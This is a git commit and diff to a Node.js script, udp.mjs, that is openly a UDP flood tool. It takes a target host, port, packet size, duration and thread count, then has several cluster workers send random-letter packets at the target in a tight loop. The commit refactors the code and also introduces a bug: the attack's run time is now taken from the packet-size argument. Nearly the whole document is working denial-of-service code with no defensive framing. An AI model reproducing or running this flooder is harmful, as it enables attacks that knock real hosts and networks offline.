2b0bce5f417806a132a4a90839ed48ff1f120b73
Zachery T. Eritano <60812567+DexeHecimal@users.noreply.github.com>
2023-03-31 15:24:15 -0400

    Update udp.mjs

--- udp.mjs
+++ udp.mjs
@@ -1,13 +1,35 @@
-// Must run with NodeJS 16, or later. (tested with node version 18.15).
 import dgram from 'node:dgram';
 import cluster from 'node:cluster';
 const sock = dgram.createSocket('udp4');
+
+process.argv[3] = process.argv[3] == 0 ? Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024 : process.argv[3];
+process.argv[4] = process.argv[4] == 0 ? Math.floor(Math.random() * (1428 - 1024 + 1)) + 5 : process.argv[4];
+
+function randStr(size) {
+    let buffer = [];
+    for (let b = 0; b < size; b++) {
+      buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65);
+    }
+    return buffer.join('');
+}
+
+// generate the random alphanum string to send.
+const attackBuffer = randStr(parseInt(process.argv[4]));
+
+function udpFlood(host, port, length) {
+    sock.send(attackBuffer, 0, length, port, host, (err) => {
+        if (err !== null) {
+            console.error(`Error encountered!: ${err}`);
+        }
+    });
+}
 
 if (cluster.isPrimary) {
     if (process.argv.length < 6) {
         console.log(`Usage: node ${process.argv[1]} [host] [port, (0 for random)] [size, (0 for random)] [time] [extra-threads]`);
         process.exit(1);
-    } else {
+    }
+    else {
         console.log(`Host: ${process.argv[2]}\nPort: ${process.argv[3] == 0 ? "random" : process.argv[3]}\nSize: ${process.argv[4] == 0 ? "random" : process.argv[4]}\nTime: ${process.argv[5]}\nThreads: ${process.argv[6]}`);
     }
 
@@ -23,33 +45,17 @@ if (cluster.isPrimary) {
         newWorker.send({ message: "start" });
     });
 } else {
-    function randStr(size) {
-        let buffer = [];
-        for (let b = 0; b < size; b++) {
-          buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65);
+    process.on('message', (msg) => {
+        if (msg.message === "start") {
+            let flood = setInterval(() => {
+                udpFlood(process.argv[2], parseInt(process.argv[3]), parseInt(process.argv[4]));
+            });
+
+            setTimeout(() => {
+                clearInterval(flood);
+                console.log("The atack has ended!\n");
+                process.exit(1);
+            }, process.argv[4] * 1000);
         }
-        return buffer.join('');
-    }
-    
-    process.argv[3] = (process.argv[3] == 0) ? Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024 : process.argv[3];
-    process.argv[4] = (process.argv[4] == 0) ? Math.floor(Math.random() * (1428 - 1024 + 1)) + 5 : process.argv[4];
-    let attackBuffer = randStr(parseInt(process.argv[4]));
-    
-    function udpFlood(host, port, length) {
-        sock.send(attackBuffer, 0, length, port, host, (err) => {
-            if (err) {
-                throw err;
-            }
-        });
-    }
-    
-    let attack = setInterval(() => {
-        udpFlood(process.argv[2], parseInt(process.argv[3]), parseInt(process.argv[4]));
     });
-    
-    setTimeout(() => {
-        clearInterval(attack); // clear the interval, free memory.
-        console.log("Attack over!\n");
-        process.exit(1);
-    }, process.argv[5] * 1000); // time in miliseconds * 1000 = seconds.
 }
